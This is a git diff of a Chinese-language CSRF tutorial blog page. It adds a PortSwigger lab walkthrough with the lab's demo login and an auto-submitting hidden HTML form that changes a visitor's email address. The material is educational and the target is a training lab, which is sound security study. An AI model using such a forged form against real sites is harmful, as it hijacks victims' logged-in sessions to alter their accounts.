@@ -34,7 +34,6 @@ export default function Blog() {
             <X.Oli>
                 由于用户经过登录后存有用于验证身份的cookie，服务器会认为请求是有效的，因而导致了非预期操作的发生。
             </X.Oli>
-
             <X.P withMarginTop>恶意站点构造可能如下：</X.P>
             <X.CodeBlock
                 language="html"
@@ -56,6 +55,38 @@ export default function Blog() {
                 当用户访问这个页面时，`POST`请求会被触发；如果用户登录了`www.mybank.com`，请求时会自动带上cookie；---
                 `www.mybank.com`认为这是用户的请求，因而将其作为正常请求处理。
             </X.P>
+            <X.H1>练习</X.H1>
+            <X.P>
+                下文给出的PortSwigger靶场中有关CSRF的Lab目标是构造一个恶意站点，更改访问它的用户的邮箱地址。\n
+                攻击者可以通过账号`wiener:peter`了解网络请求结构。
+            </X.P>
+            <X.P>
+                @PortSwigger Lab: CSRF vulnerability with no defenses---
+                [https://portswigger.net/web-security/csrf/lab-no-defenses]@
+            </X.P>
+            <X.P>
+                攻击者有一个`exploit-server`服务器（如下图），其中的`/exploit`页面发送给受害用户访问，---
+                Lab的目标是编写`/exploit`页面，让访问到的用户的邮箱地址被更改。
+            </X.P>
+            <X.Image src="env.jpg" width="100%" />
+            <X.Oli reset={1}>
+                登录账号`wiener:peter`，使用更新邮箱功能，观察网络请求，发现请求的接口是`/my-account/change-email`，并携带参数`email`：
+            </X.Oli>
+            <X.Image src="1-1.jpg" width="100%" />
+            <X.P>根据上述发现，构造一个立即提交的表单请求，`action`为有漏洞网站的地址：</X.P>
+            <X.CodeBlock
+                language="html"
+                code={`
+                <form action="https://0a7f00ed032da08580297635009a00f7.web-security-academy.net/my-account/change-email" method="post">
+                    <input type="hidden" name="email" value="abcd@abcd.com"/>
+                </form>
+                <script>
+                    document.forms[0].submit();
+                </script>
+                `}
+            />
+            <X.Oli>提交通过。</X.Oli>
+            <X.Image src="1-2.jpg" width="100%" />
             <X.H1>参考资料</X.H1>
             <X.P noMarginBottom>本文的插图和例子来源于：</X.P>
             <X.Uli>
